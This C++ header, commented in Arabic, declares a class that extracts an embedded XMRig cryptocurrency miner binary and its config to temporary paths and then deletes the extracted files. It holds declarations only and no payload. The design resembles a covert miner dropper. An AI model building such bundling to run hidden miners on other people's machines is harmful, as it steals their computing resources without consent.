#ifndef BINARY_EMBEDDER_H
#define BINARY_EMBEDDER_H

#include <string>
#include <vector>

/**
 * فئة لتضمين واستخراج الملفات الثنائية المدمجة
 */
class BinaryEmbedder {
public:
    static bool extractXMRig(const std::string& outputPath);
    static bool extractConfig(const std::string& outputPath);
    static void cleanupExtractedFiles();
    
private:
    static bool writeDataToFile(const std::string& path, const unsigned char* data, size_t size);
    static std::string generateTempPath(const std::string& filename);
};

// تضمين XMRig كـ binary array (سيتم توليده بواسطة السكريبت)
extern const unsigned char embedded_xmrig[];
extern const size_t embedded_xmrig_size;

extern const unsigned char embedded_config[];
extern const size_t embedded_config_size;

#endif // BINARY_EMBEDDER_H
